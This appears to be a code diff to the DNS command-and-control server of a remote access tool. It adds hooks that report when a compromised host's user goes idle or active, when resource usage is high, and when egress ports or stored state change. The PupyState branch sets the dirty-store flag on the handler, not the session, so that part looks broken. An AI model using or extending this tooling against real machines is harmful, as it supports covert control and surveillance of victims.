@@ -149,8 +149,9 @@ class Session(ExpirableObject):
         'system_info', 'system_status', 'online_status',
         'open_ports', 'egress_ports', 'commands',
         'last_nonce', 'last_qname', 'pstore_dirty', 'connected',
-        'cache',
-        '_encoder'
+        'cache', '_encoder',
+        '_pstore_dirty_reported', '_users_cnt_reported',
+        '_high_resource_usage_reported', '_user_active_reported'
     )
 
     def __init__(self, node, cid, spi, encoder, commands, timeout):
@@ -172,6 +173,11 @@ class Session(ExpirableObject):
         self.pstore_dirty = False
         self.connected = False
         self.cache = {}
+
+        self._pstore_dirty_reported = False
+        self._users_cnt_reported = None
+        self._high_resource_usage_reported = False
+        self._user_active_reported = None
 
     @property
     def encoder(self):
@@ -504,6 +510,30 @@ class DnsCommandServerHandler(BaseResolver):
     def on_session_cleaned_up(self, session):
         pass
 
+    def on_online_status(self, session):
+        pass
+
+    def on_egress_ports(self, session):
+        pass
+
+    def on_pstore(self, session):
+        pass
+
+    def on_user_become_active(self, session):
+        pass
+
+    def on_user_become_inactive(self, session):
+        pass
+
+    def on_users_increment(self, session):
+        pass
+
+    def on_users_decrement(self, session):
+        pass
+
+    def on_hight_resource_usage(self, session):
+        pass
+
     def _a_page_encoder(self, data, encoder, nonce):
         data = encoder.encode(data, nonce, symmetric=encoder.kex_completed)
 
@@ -689,6 +719,31 @@ class DnsCommandServerHandler(BaseResolver):
             if isinstance(command, SystemStatus):
                 session.system_status = command.get_dict()
 
+                if session._users_cnt_reported is not None and \
+                  session._users_cnt_reported != session.system_status['users']:
+                    if session._users_cnt_reported > session.system_status['users']:
+                        self.on_users_decrement(session)
+                    else:
+                        self.on_users_increment(session)
+
+                session._users_cnt_reported = session.system_status['users']
+
+                if session.system_status['mem'] > 90 or session.system_status['cpu'] > 90:
+                    if not session._high_resource_usage_reported:
+                        self.on_hight_resource_usage(session)
+                        session._high_resource_usage_reported = True
+                else:
+                    session._high_resource_usage_reported = False
+
+                if session._user_active_reported is not None and \
+                  session._user_active_reported != session.system_status['idle']:
+                    if session.system_status['idle']:
+                        self.on_user_become_inactive(session)
+                    else:
+                        self.on_user_become_active(session)
+
+                session._user_active_reported = session.system_status['idle']
+
             commands = session.commands
             return commands
 
@@ -714,6 +769,7 @@ class DnsCommandServerHandler(BaseResolver):
 
         elif isinstance(command, OnlineStatus) and session is not None:
             session.online_status = command.get_dict()
+            self.on_online_status(session)
 
         elif isinstance(command, ConnectablePort) and session is not None:
             if command.ip not in session.open_ports:
@@ -726,9 +782,17 @@ class DnsCommandServerHandler(BaseResolver):
             for port in command.ports:
                 session.egress_ports.add(port)
 
+            self.on_egress_ports(session)
+
         elif isinstance(command, PupyState) and session is not None:
             session.pstore_dirty = command.pstore_dirty
             session.connected = command.connected
+
+            if session.pstore_dirty and not self._pstore_dirty_reported:
+                self._pstore_dirty_reported = True
+                self.on_pstore(session)
+            elif not session.pstore_dirty:
+                self._pstore_dirty_reported = False
 
         elif isinstance(command, Ack) and (session is not None):
             if session.system_info:
